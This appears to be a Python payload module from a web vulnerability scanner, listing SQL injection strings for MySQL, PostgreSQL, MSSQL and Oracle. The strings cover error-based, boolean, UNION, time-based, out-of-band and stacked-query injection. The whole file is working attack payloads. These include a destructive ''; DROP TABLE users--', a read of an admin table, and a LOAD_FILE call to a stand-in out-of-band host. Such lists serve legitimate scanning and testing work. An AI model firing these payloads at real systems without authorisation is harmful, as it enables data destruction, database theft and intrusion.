"""SQL Injection payloads — error-based, union, blind, time-based."""

NAME = "SQL Injection"
DESCRIPTION = "Error-based, UNION, boolean-blind, and time-based SQL injection payloads"
RISK = "MEDIUM"

PAYLOADS = [
    # Error-based detection
    "'",
    "\"",
    "')",
    "\")",
    "`",
    "';",
    "\";",
    # Boolean-based
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    "' OR '1'='1'/*",
    "\" OR \"1\"=\"1",
    "\" OR \"1\"=\"1\"--",
    "OR 1=1",
    "OR 1=1--",
    "OR 1=1#",
    "OR 1=1/*",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    # AND-based detection
    "' AND '1'='1",
    "' AND '1'='2",
    "' AND 1=1--",
    "' AND 1=2--",
    # UNION-based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL--",
    "' UNION ALL SELECT NULL,NULL--",
    "\" UNION SELECT NULL--",
    # MySQL-specific
    "' UNION SELECT @@version--",
    "' UNION SELECT database()--",
    "' UNION SELECT user()--",
    "') UNION SELECT NULL--",
    # PostgreSQL-specific
    "' UNION SELECT NULL::text--",
    "' UNION SELECT current_database()--",
    # MSSQL-specific
    "' UNION SELECT @@version--",
    "' UNION SELECT DB_NAME()--",
    # Oracle-specific
    "' UNION SELECT NULL FROM DUAL--",
    "' UNION SELECT banner FROM v$version--",
    # Time-based (MySQL)
    "' OR SLEEP(3)--",
    "' OR SLEEP(5)--",
    "' AND SLEEP(3)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
    # Time-based (PostgreSQL)
    "' OR pg_sleep(3)--",
    "' AND pg_sleep(3)--",
    # Time-based (MSSQL)
    "'; WAITFOR DELAY '0:0:3'--",
    "'; WAITFOR DELAY '0:0:5'--",
    # Time-based (Oracle)
    "' OR DBMS_PIPE.RECEIVE_MESSAGE('a',3)--",
    # Out-of-band (MySQL)
    "' LOAD_FILE('\\\\test.oob.com\\a')--",
    # Stacked queries
    "'; DROP TABLE users--",
    "'; SELECT * FROM admin--",
    # Comment variants
    "'--",
    "'#",
    "'/*",
    "'-- -",
    "'--+",
]
